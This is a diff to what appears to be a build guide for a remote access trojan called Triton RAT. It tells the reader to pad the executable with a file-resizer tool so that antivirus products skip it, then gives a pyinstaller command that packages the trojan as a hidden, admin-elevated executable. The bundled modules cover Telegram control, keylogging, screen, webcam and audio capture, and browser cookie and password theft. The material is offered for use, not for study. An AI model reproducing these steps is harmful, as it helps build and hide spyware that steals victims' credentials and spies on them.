@@ -74,7 +74,11 @@ $ For obfuscation we will use my python program which you can find at the link: 
 $ https://github.com/WhiteeRabbit/fake_file_resizer
 # We can increase the file size through this appalication so that antiviruses skip rat beacuse of size.
 # For example if you write the size 620 mb , Antivirus Eset will skip that,and it will less detetct.
+# Download fake_file_resizer, then run:
+$ python fake_file_resizer.py
+# Enter your exe, then enter output file name after that write output file size in mb(don't write mb).
 # Today this is the best obfuscation method of obfuscation 
+
 
 # after downloading pyinstaller run:
 $ pyinstaller --onefile --noconsole --uac-admin --hidden-import telebot --hidden-import pyautogui --hidden-import cv2 --hidden-import json --hidden-import base64 --hidden-import sqlite3 --hidden-import win32crypt --hidden-import Cryptodome.Cipher.AES --hidden-import shutil --hidden-import datetime --hidden-import numpy --hidden-import pyaudio --hidden-import wave --hidden-import random --hidden-import browser_cookie3 --hidden-import pyttsx3 --hidden-import pynput Triton_Rat_Release.py
